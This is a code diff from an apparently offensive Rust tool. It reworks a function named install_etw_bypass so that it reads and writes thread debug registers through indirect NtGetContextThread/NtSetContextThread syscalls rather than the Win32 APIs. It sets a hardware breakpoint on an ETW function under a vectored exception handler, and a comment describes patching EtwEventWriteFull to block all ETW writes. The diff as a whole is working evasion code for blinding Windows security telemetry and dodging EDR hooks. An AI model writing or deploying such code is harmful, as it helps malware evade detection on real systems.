@@ -1,12 +1,9 @@
 #[cfg(target_os = "windows")]
 use windows_sys::Win32::{
     Foundation::EXCEPTION_SINGLE_STEP,
-    System::{
-        Diagnostics::Debug::{
-            AddVectoredExceptionHandler, EXCEPTION_POINTERS,
-            SetThreadContext, GetThreadContext, CONTEXT, CONTEXT_DEBUG_REGISTERS_AMD64,
-        },
-        Threading::GetCurrentThread,
+    System::Diagnostics::Debug::{
+        AddVectoredExceptionHandler, EXCEPTION_POINTERS,
+        CONTEXT, CONTEXT_DEBUG_REGISTERS_AMD64,
     },
 };
 
@@ -36,15 +33,20 @@ pub unsafe fn install_etw_bypass() {
     };
     ETW_ADDR = etw_fn as usize;
 
+    use crate::evasion::syscalls::{get_ssn, indirect_syscall};
     AddVectoredExceptionHandler(1, Some(etw_veh_handler));
 
-    let thread = GetCurrentThread();
+    let thread: isize = !1isize; // -2 = current thread pseudo-handle
     let mut ctx: CONTEXT = core::mem::zeroed();
     ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS_AMD64;
-    GetThreadContext(thread, &mut ctx);
+    if let Some((ssn_get, tramp_get)) = get_ssn(b"NtGetContextThread") {
+        indirect_syscall(ssn_get, tramp_get, thread as usize, &mut ctx as *mut CONTEXT as usize, 0, 0, 0, 0);
+    }
     ctx.Dr1  = ETW_ADDR as u64;
     ctx.Dr7 |= 0x4;
-    SetThreadContext(thread, &ctx);
+    if let Some((ssn_set, tramp_set)) = get_ssn(b"NtSetContextThread") {
+        indirect_syscall(ssn_set, tramp_set, thread as usize, &ctx as *const CONTEXT as usize, 0, 0, 0, 0);
+    }
 }
 
 /// Hot-patch EtwEventWriteFull with xor eax,eax; ret — blocks all ETW writes.
